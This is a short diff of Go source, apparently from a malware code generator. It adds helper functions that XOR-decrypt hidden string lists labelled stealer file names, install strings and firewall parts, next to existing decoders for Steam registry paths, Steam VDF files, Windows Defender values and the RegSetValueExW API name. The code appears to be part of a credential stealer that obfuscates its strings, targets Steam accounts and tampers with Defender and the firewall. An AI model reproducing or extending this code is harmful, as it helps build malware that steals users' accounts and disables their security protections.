@@ -551,5 +551,25 @@ func getSteamRegPaths() []string               { return decryptList(encSteamRegP
 func getSteamVdfNames() []string               { return decryptList(encSteamVdfNames) }
 func getDefenderValues() []string              { return decryptList(encDefenderValues) }
 func getRegSetValueExWName() string            { return string(xor(encRegSetValueExWName, decryptionKey)) }
+
+func getStealerFileNames() []string            { return decryptList(encStealerFileNames) }
+func getInstallStrings() []string              { return decryptList(encInstallStrings) }
+func getFirewallParts() []string               { return decryptList(encFirewallParts) }
+
+func sfn(idx int) string {
+	s := getStealerFileNames()
+	if idx < len(s) { return s[idx] }
+	return ""
+}
+func isn(idx int) string {
+	s := getInstallStrings()
+	if idx < len(s) { return s[idx] }
+	return ""
+}
+func fwp(idx int) string {
+	s := getFirewallParts()
+	if idx < len(s) { return s[idx] }
+	return ""
+}
 `)
 }
